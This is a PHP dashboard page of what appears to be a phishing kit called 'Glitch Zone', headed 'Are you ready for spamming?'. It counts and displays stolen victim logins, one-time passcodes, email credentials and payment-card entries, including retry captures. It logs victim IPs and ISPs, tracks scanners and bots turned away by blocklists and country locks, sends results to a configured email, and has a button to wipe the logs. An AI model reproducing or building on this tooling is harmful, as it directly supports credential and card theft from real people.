<?php
session_start();
error_reporting(0);
$settings = json_decode(file_get_contents("../config.json"), true);

if (!isset($_SESSION['logged_in'])) {
    header('location: /glitch');
    die();
}
function count_human($file) {
    $count = 0;
    if (file_exists($file)) {
        $lines = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        foreach ($lines as $line) {
            if (stripos($line, 'Human') !== false) {
                $count++;
            }
        }
    }
    return $count;
}

function count_c($filename) {
    if (!file_exists($filename)) return 0;
    $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    return count($lines);
}

$total_click    = count_human("../logs/allow.txt");
$total_login    = count_c("../logs/data_login.txt");
$total_otp      = count_c("../logs/data_otp.txt");
$total_email    = count_c("../logs/data_email.txt");
$total_card     = count_c("../logs/data_card.txt");
$total_relogin  = count_c("../logs/data_relogin.txt");
$total_reotp    = count_c("../logs/data_reotp.txt");
$total_reemail  = count_c("../logs/data_reemail.txt");
$total_recard   = count_c("../logs/data_recard.txt");
$total_block    = count_c("../system/blocker/onetime.dat");
$total_bot      = count_c("../logs/block.txt");

if (isset($_POST['delete_logs'])) {
    $log_files = [
        "../logs/allow.txt",
        "../logs/data_login.txt",
        "../logs/data_otp.txt",
        "../logs/data_email.txt",
        "../logs/data_card.txt",
        "../logs/data_relogin.txt",
        "../logs/data_reotp.txt",
        "../logs/data_reemail.txt",
        "../logs/data_recard.txt",
        "../system/blocker/onetime.dat",
        "../logs/block.txt"
    ];

    foreach ($log_files as $file) {
        if (file_exists($file)) {
            file_put_contents($file, "");
        }
    }

    $_SESSION['msg'] = "deleted";
    header("Location: ".$_SERVER['PHP_SELF']);
    exit();
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Title Meta -->
    <meta charset="utf-8" />
    <title>Dashboard | Glitch Zone</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <base href="/panel/">
    <meta name="theme-color" content="#ffffff">
    <!-- App favicon -->
    <link rel="shortcut icon" href="assets/img/favicon.ico">
    <!-- Google Font Family link -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Play:wght@400;700&display=swap" rel="stylesheet">
    <!-- Vendor css -->
    <link href="assets/css/vendor.min.css" rel="stylesheet" type="text/css" />
    <!-- Icons css -->
    <link href="assets/css/icons.min.css" rel="stylesheet" type="text/css" />
    <!-- App css -->
    <link href="assets/css/style.min.css" rel="stylesheet" type="text/css" />
    <!-- Data Tables CSS -->
    <link href="assets/css/dataTables.bootstrap5.css" rel="stylesheet" />
	<link href="assets/css/buttons.bootstrap5.min.css"  rel="stylesheet">
	<link href="assets/css/responsive.bootstrap5.css" rel="stylesheet" />
    <!-- Theme Config js -->
    <script src="assets/js/config.js"></script>
    <style>
    /* Glitch Text Style */
    .glitch {
        font-size: 1rem;
        font-weight: bold;
        letter-spacing: 2px;
        text-transform: uppercase;
        position: relative;
        display: inline-block;
        animation: glitch-skew 1s infinite linear alternate-reverse,
                   glitch-flicker 3s infinite;
    }
    
    /* Dark Mode */
    .logo-dark .glitch {
        color: black;
    }
    
    .logo-dark .glitch::before,
    .logo-dark .glitch::after {
        color: black;
    }
    
    /* Light Mode */
    .logo-light .glitch {
        color: white;
    }
    
    .logo-light .glitch::before,
    .logo-light .glitch::after {
        color: white;
    }
    
    /* Glitch Effects */
    .glitch::before,
    .glitch::after {
        content: attr(data-text);
        position: absolute;
        top: 0;
        width: 100%;
        overflow: hidden;
        clip: rect(0, 0, 0, 0);
    }
    
    .glitch::before {
        left: 2px;
        text-shadow: -2px 0 red;
        animation: glitch-anim 2s infinite linear alternate-reverse;
    }
    
    .glitch::after {
        left: -2px;
        text-shadow: -2px 0 blue;
        animation: glitch-anim2 1.5s infinite linear alternate-reverse;
    }
    
    /* Animations */
    @keyframes glitch-anim {
        0% { clip: rect(0, 9999px, 0, 0); }
        5% { clip: rect(0, 9999px, 10px, 0); }
        10% { clip: rect(0, 9999px, 5px, 0); }
        15% { clip: rect(5px, 9999px, 15px, 0); }
        20% { clip: rect(15px, 9999px, 25px, 0); }
        25% { clip: rect(10px, 9999px, 20px, 0); }
        30% { clip: rect(20px, 9999px, 30px, 0); }
        100% { clip: rect(0, 9999px, 0, 0); }
    }
    
    @keyframes glitch-anim2 {
        0% { clip: rect(0, 9999px, 0, 0); }
        10% { clip: rect(10px, 9999px, 20px, 0); }
        20% { clip: rect(15px, 9999px, 25px, 0); }
        30% { clip: rect(5px, 9999px, 15px, 0); }
        40% { clip: rect(0px, 9999px, 10px, 0); }
        100% { clip: rect(0, 9999px, 0, 0); }
    }
    
    @keyframes glitch-skew {
        0% { transform: skew(0deg); }
        50% { transform: skew(5deg); }
        100% { transform: skew(-5deg); }
    }
    
    @keyframes glitch-flicker {
        0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
            opacity: 1;
        }
        20%, 22%, 24%, 55% {
            opacity: 0.8;
        }
    }
    </style>
</head>
<body>
    <!-- START Wrapper -->
    <div class="app-wrapper">
        <!-- Topbar Start -->
        <header class="app-topbar">
            <div class="container-fluid">
                <div class="navbar-header">
                    <div class="d-flex align-items-center gap-2">
                        <!-- Menu Toggle Button -->
                        <div class="topbar-item">
                            <button type="button" class="button-toggle-menu topbar-button">
                                <iconify-icon icon="line-md:menu"class="fs-24 align-middle"></iconify-icon>
                            </button>
                        </div>
                    </div>
                    <div class="d-flex align-items-center gap-2">
                        <!-- Theme Color (Light/Dark) -->
                        <div class="topbar-item">
                            <button type="button" class="topbar-button" id="light-dark-mode">
                                <iconify-icon icon="line-md:moon-alt-loop" class="fs-22 align-middle light-mode"></iconify-icon>
                                <iconify-icon icon="line-md:moon-alt-to-sunny-outline-loop-transition" class="fs-22 align-middle dark-mode"></iconify-icon>
                            </button>
                        </div>
                        <!-- Delete Logs -->
                        <div class="topbar-item">
                            <form id="deleteForm" method="POST">
                                <input type="hidden" name="delete_logs" value="1">
                                <button type="button" onclick="confirmDelete()" class="btn btn-outline-danger rounded-pill">
                                    <iconify-icon icon="line-md:trash" class="fs-22 align-middle light-mode"></iconify-icon> Delete Logs
                                </button>
                            </form>
                        </div>
                        <!-- User -->
                        <div class="dropdown topbar-item">
                            <a type="button" class="topbar-button" id="page-header-user-dropdown" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                <span class="d-flex align-items-center">
                                    <img class="rounded-circle" width="32" src="assets/img/glitch-avatar.png" alt="avatar-3">
                                </span>
                            </a>
                            <div class="dropdown-menu dropdown-menu-end">
                                <!-- item-->
                                <a class="dropdown-item text-danger" href="/glitch/out">
                                    <iconify-icon icon="line-md:logout" class="align-middle me-2 fs-18"></iconify-icon>
                                    <span class="align-middle">Logout</span>
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </header>
        <!-- Topbar End -->
        <!-- App Menu Start -->
        <div class="app-sidebar">
            <!-- Sidebar Logo -->
            <div class="logo-box">
                <a href="/glitch/home" class="logo-dark">
                    <p class="glitch" data-text="GLITCH ZONE">GLITCH ZONE</p>
                </a>
                <a href="/glitch/home" class="logo-light">
                    <p class="glitch" data-text="GLITCH ZONE">GLITCH ZONE</p>
                </a>
            </div>
            <div class="scrollbar" data-simplebar>
                <ul class="navbar-nav" id="navbar-nav">
                    <li class="menu-title">Menu</li>
                    <li class="nav-item active">
                        <a class="nav-link active" href="/glitch/home">
                            <span class="nav-icon">
                                <iconify-icon icon="line-md:home-md"></iconify-icon>
                            </span>
                            <span class="nav-text"> Dashboard </span>
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/glitch/configurate">
                             <span class="nav-icon">
                                  <iconify-icon icon="line-md:cog-loop"></iconify-icon>
                             </span>
                             <span class="nav-text"> Configuration </span>
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="https://<?= $_SERVER['HTTP_HOST']; ?>/?<?= $settings['config']['parameter']; ?>" target="_blank">
                             <span class="nav-icon">
                                  <iconify-icon icon="line-md:watch"></iconify-icon>
                             </span>
                             <span class="nav-text"> View Site </span>
                        </a>
                    </li>
                </ul>
            </div>
        </div>
        <div class="animated-stars">
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
        </div>
        <!-- App Menu End -->
        <!-- ==================================================== -->
        <!-- Start right Content here -->
        <!-- ==================================================== -->
        <div class="page-content">
            <!-- Start Container Fluid -->
            <div class="container-fluid">
                <!-- ========== Page Title Start ========== -->
                <div class="row">
                    <div class="col-12">
                        <div class="page-title-box">
                            <h4 class="mb-0">Are you ready for spamming?</h4>
                            <h4 class="mb-0">Time: 
                                <button type="button" class="btn btn-outline-primary me-1 mb-1" id="dateTime">
                                </button>
                            </h4>
                            <ol class="breadcrumb mb-0">
                                <li class="breadcrumb-item"><a href="javascript: void(0);">Glitch</a></li>
                                <li class="breadcrumb-item active">Dashboard</li>
                            </ol>
                        </div>
                    </div>
                </div>
                <!-- ========== Page Title End ========== -->
                <div class="row">
                    <!-- Card 1 -->
                    <div class="col-md-6 col-xl-3">
                        <div class="card">
                            <div class="card-body">
                                <div class="row">
                                    <div class="col-6">
                                        <p class="text-muted mb-0 text-truncate">Total Views</p>
                                        <h3 class="text-dark mt-2 mb-0"><?= $total_click; ?></h3>
                                    </div>
                                    <div class="col-6">
                                        <div class="ms-auto avatar-md bg-soft-primary rounded">
                                            <iconify-icon icon="line-md:link" class="fs-32 avatar-title text-primary"></iconify-icon>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- Card 2 -->
                    <div class="col-md-6 col-xl-3">
                        <div class="card">
                            <div class="card-body">
                                <div class="row">
                                    <div class="col-6">
                                        <p class="text-muted mb-0 text-truncate">Total Login / re-Login</p>
                                        <h3 class="text-dark mt-2 mb-0"><?= $total_login ?> / <?= $total_relogin ?></h3>
                                    </div>
                                    <div class="col-6">
                                        <div class="ms-auto avatar-md bg-soft-primary rounded">
                                            <iconify-icon icon="line-md:login" class="fs-32 avatar-title text-primary"></iconify-icon>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- Card 3 -->
                    <div class="col-md-6 col-xl-3">
                        <div class="card">
                            <div class="card-body">
                                <div class="row">
                                    <div class="col-6">
                                        <p class="text-muted mb-0 text-truncate">Total OTP / re-OTP</p>
                                        <h3 class="text-dark mt-2 mb-0"><?= $total_otp ?> / <?= $total_reotp ?></h3>
                                    </div>
                                    <div class="col-6">
                                        <div class="ms-auto avatar-md bg-soft-primary rounded">
                                            <iconify-icon icon="line-md:cellphone-arrow-down-twotone" class="fs-32 avatar-title text-primary"></iconify-icon>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- Card 4 -->
                    <div class="col-md-6 col-xl-3">
                        <div class="card">
                            <div class="card-body">
                                <div class="row">
                                    <div class="col-6">
                                        <p class="text-muted mb-0 text-truncate">Total Email / re-Email</p>
                                        <h3 class="text-dark mt-2 mb-0"><?= $total_email ?> / <?= $total_reemail ?></h3>
                                    </div>
                                    <div class="col-6">
                                        <div class="ms-auto avatar-md bg-soft-primary rounded">
                                            <iconify-icon icon="line-md:email-arrow-down" class="fs-32 avatar-title text-primary"></iconify-icon>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- Card 5 -->
                    <div class="col-md-6 col-xl-3">
                        <div class="card">
                            <div class="card-body">
                                <div class="row">
                                    <div class="col-6">
                                        <p class="text-muted mb-0 text-truncate">Total Card / re-Card</p>
                                        <h3 class="text-dark mt-2 mb-0"><?= $total_card ?> / <?= $total_recard ?></h3>
                                    </div>
                                    <div class="col-6">
                                        <div class="ms-auto avatar-md bg-soft-primary rounded">
                                            <iconify-icon icon="line-md:coffee-half-empty-filled-loop" class="fs-32 avatar-title text-primary"></iconify-icon>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- Card 6 -->
                    <div class="col-md-6 col-xl-3">
                        <div class="card">
                            <div class="card-body">
                                <div class="row">
                                    <div class="col-6">
                                        <p class="text-muted mb-0 text-truncate">Bot and One Time Access</p>
                                        <h3 class="text-dark mt-2 mb-0"><?= $total_bot ?> / <?= $total_block ?></h3>
                                    </div>
                                    <div class="col-6">
                                        <div class="ms-auto avatar-md bg-soft-primary rounded">
                                            <iconify-icon icon="line-md:person-off" class="fs-32 avatar-title text-primary"></iconify-icon>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-6 col-xl-3">
                        <div class="card">
                            <div class="card-body p-3">
                                <div class="table-responsive">
                                    <table class="table table-flush" style="margin-bottom: 0;">
                                        <tbody>
                                            <tr class="d-flex">
                                                <td class="mb-0 text-sm text-bold">Parameter</td>
                                                <td class="mb-0 text-sm text-bold">: 
                                                    <?php
                                                    if ($settings['config']['useparameter'] === 'on') {
                                                        echo 'Active';
                                                    } elseif ($settings['config']['useparameter'] === 'off') {
                                                        echo 'Non-Active';
                                                    } else {
                                                        echo htmlspecialchars($settings['config']['useparameter']);
                                                    }
                                                    ?>
                                                </td>
                                            </tr>
                                            <tr class="d-flex">
                                                <td class="mb-0 text-sm text-bold">Parameter</td>
                                                <td class="mb-0 text-sm text-bold">: <?= $settings['config']['parameter']; ?></td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-6 col-xl-3">
                        <div class="card">
                            <div class="card-body p-3">
                                <div class="table-responsive">
                                    <table class="table table-flush" style="margin-bottom: 0;">
                                        <tbody>
                                            <tr class="d-flex">
                                                <td class="mb-0 text-sm text-bold">Send Result use</td>
                                                <td class="mb-0 text-sm text-bold">: 
                                                    <?php
                                                    if ($settings['config']['sending'] === 'mail') {
                                                        echo 'Internal';
                                                    } elseif ($settings['config']['sending'] === 'smtp') {
                                                        echo 'External';
                                                    } else {
                                                        echo htmlspecialchars($settings['config']['sending']);
                                                    }
                                                    ?>
                                                </td>
                                            </tr>
                                            <tr class="d-flex">
                                                <td class="mb-0 text-sm text-bold">Email Result</td>
                                                <td class="mb-0 text-sm text-bold">: <?= $settings['config']['emailResult']; ?></td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="col-xl-6">
                        <div class="card">
                            <div class="card-header d-flex justify-content-between align-items-center">
                                <h4 class="card-title mb-0">Recent Views</h4>
                            </div>
                            <!-- end card-header-->
                            <div class="card-body pb-1">
                                <div class="table-responsive">
                                    <div id="basic-datatable_wrapper" class="dataTables_wrapper dt-bootstrap5">
                                        <div class="row">
                                            <div class="col-sm-12">
                                                <table class="table align-middle m-0" id="basic-datatable" role="grid" aria-describedby="basic-datatable_info">
                                                    <thead>
                                                        <th class="py-1">Date</th>
                                                        <th class="py-1">IP Address</th>
                                                        <th class="py-1">Country</th>
                                                        <th class="py-1">ISP</th>
                                                        <th class="py-1">Type</th>
                                                    </thead>
                                                    <tbody>
                                                        <?php
                                                        function tampilkanLog($file, $filter, $labelClass, $labelText) {
                                                            if (!file_exists($file)) {
                                                                echo "<tr><td colspan='5'>File $file tidak ditemukan.</td></tr>";
                                                                return;
                                                            }
                                                        
                                                            $lines = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
                                                        
                                                            foreach ($lines as $line) {
                                                                $parts = explode("|", $line);
                                                                $date = $parts[0] ?? '';
                                                                $ip = $parts[1] ?? '';
                                                                $country = $parts[2] ?? '';
                                                                $isp = $parts[3] ?? '';
                                                                $activity = trim($parts[4] ?? '');
                                                        
                                                                if ($ip == "") continue;
                                                        
                                                                if ($filter === 'human' && strtolower($activity) !== "human") continue;
                                                                if ($filter === 'blocked') {
                                                                    $blacklistTypes = [
                                                                        'useragent blacklist',
                                                                        'ip blacklist',
                                                                        'isp blacklist',
                                                                        'dns blacklist',
                                                                        'hostname blacklist',
                                                                        'one time access',
                                                                        'blocked by lock country',
                                                                        'blocked'
                                                                    ];
                                                        
                                                                    $matched = false;
                                                                    foreach ($blacklistTypes as $type) {
                                                                        if (stripos($activity, $type) !== false) {
                                                                            $matched = true;
                                                                            break;
                                                                        }
                                                                    }
                                                        
                                                                    if (!$matched) continue;
                                                                }
                                                        
                                                                $activity_display = '<span class="badge ' . $labelClass . '">' . htmlspecialchars($activity) . '</span>';
                                                        
                                                                echo "<tr>
                                                                    <td>$date</td>
                                                                    <td>$ip</td>
                                                                    <td>$country</td>
                                                                    <td>$isp</td>
                                                                    <td>$activity_display</td>
                                                                </tr>";
                                                            }
                                                        }
                                                        
                                                        tampilkanLog("../logs/allow.txt", 'human', 'badge-outline-success me-1', 'Human');
                                                        
                                                        tampilkanLog("../logs/block.txt", 'blocked', 'badge-outline-danger me-1', 'Blocked');
                                                        ?>
                                                    </tbody>
                                                </table>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <!-- end card body -->
                        </div>
                        <!-- end card-->
                    </div>
                    <!-- end col -->
                    <div class="col-xl-6">
                        <div class="card">
                            <div class="card-header d-flex justify-content-between align-items-center">
                                <h4 class="card-title mb-0">
                                    Recent Activity
                                </h4>
                            </div>
                            <!-- end card-header-->
                            <div class="card-body">
                                <div class="table-responsive">
                                    <div id="basic-datatable_wrapper" class="dataTables_wrapper dt-bootstrap5">
                                        <div class="row">
                                            <div class="col-sm-12">
                                                <table class="table align-middle m-0" id="responsive-datatable" role="grid" aria-describedby="basic-datatable_info">
                                                    <thead>
                                                        <th class="py-1">Date</th>
                                                        <th class="py-1">IP Address</th>
                                                        <th class="py-1">Country</th>
                                                        <th class="py-1">ISP</th>
                                                        <th class="py-1">Activity</th>
                                                    </thead>
                                                    <tbody>
                                                        <?php
                                                        if(file_exists("../logs/allow.txt")){
                                                            $glitch = file_get_contents("../logs/allow.txt");
                                                            $glitch = explode("\n", $glitch);
                                                            foreach($glitch as $bitch) {
                                                                $bitch = explode("|", $bitch);
                                                                $date = $bitch[0] ?? '';
                                                                $ip = $bitch[1] ?? '';
                                                                $country = $bitch[2] ?? '';
                                                                $isp = $bitch[3] ?? '';
                                                                $activity = trim($bitch[4] ?? '');
                                                                if($ip == "" || strtolower($activity) == "human") {
                                                                    continue;
                                                                }
                                                                echo "<tr>
                                                                    <td>".$date."</td>
                                                                    <td>".$ip."</td>
                                                                    <td>".$country."</td>
                                                                    <td>".$isp."</td>
                                                                    <td><span class='badge badge-outline-info me-1'>".$activity."</span></td>
                                                                </tr>";
                                                            }
                                                        } else {
                                                            echo "<tr><td colspan='5'>Not found</td></tr>";
                                                        }
                                                        ?>
                                                    </tbody>
                                                </table>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <!-- end card body -->
                        </div>
                        <!-- end card-->
                    </div>
                    <!-- end col -->
                </div>
                <!-- end row -->
            </div>
            <!-- End Container Fluid -->
            <!-- Footer Start -->
            <footer class="footer">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-12 text-center">
                            <script>document.write(new Date().getFullYear())</script> &copy; Glitch.</a>
                        </div>
                    </div>
                </div>
            </footer>
            <!-- Footer End -->
        </div>
        <!-- ==================================================== -->
        <!-- End Page Content -->
        <!-- ==================================================== -->
    </div>
    <!-- END Wrapper -->
    <!-- Vendor Javascript -->
    <script src="assets/js/vendor.min.js"></script>
    <!-- App Javascript -->
    <script src="assets/js/app.js"></script>
    <!-- Data tables -->
    <script src="assets/js/jquery-3.6.0.min.js"></script>
    <script src="assets/js/jquery.dataTables.min.js"></script>
    <script src="assets/js/dataTables.bootstrap5.js"></script>
    <script src="assets/js/dataTables.responsive.min.js"></script>
    <script src="assets/js/table-data.js"></script>
    <!-- SweetAlert -->
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script>
    function confirmDelete() {
        Swal.fire({
            title: 'Are you sure?',
            text: "All logs will be permanently deleted!",
            icon: 'warning',
            showCancelButton: true,
            confirmButtonColor: '#d33',
            cancelButtonColor: '#6c757d',
            confirmButtonText: 'Yes, delete all!',
            background: '#1c1c1c',
            color: '#fff'
        }).then((result) => {
            if (result.isConfirmed) {
                document.getElementById('deleteForm').submit();
            }
        });
    }
    function updateDateTime() {
        const now = new Date();
        const formattedDateTime = now.toLocaleString('en-US', {
            year: 'numeric',
            month: 'long',
            day: 'numeric',
            hour: 'numeric',
            minute: 'numeric',
            second: 'numeric',
            timeZone: "Asia/Jakarta",
            hour12: true
        });
        document.getElementById('dateTime').textContent = formattedDateTime;
    }

    updateDateTime();
    setInterval(updateDateTime, 1000);
    </script>
    <?php if (isset($_SESSION['msg']) && $_SESSION['msg'] == "deleted") { ?>
    <script>
    Swal.fire({
        title: 'Deleted!',
        text: 'All logs have been successfully cleared.',
        icon: 'success',
        confirmButtonColor: '#3085d6',
        background: '#1c1c1c',
        color: '#fff'
    });
    </script>
    <?php unset($_SESSION['msg']); } ?>
</body>
</html>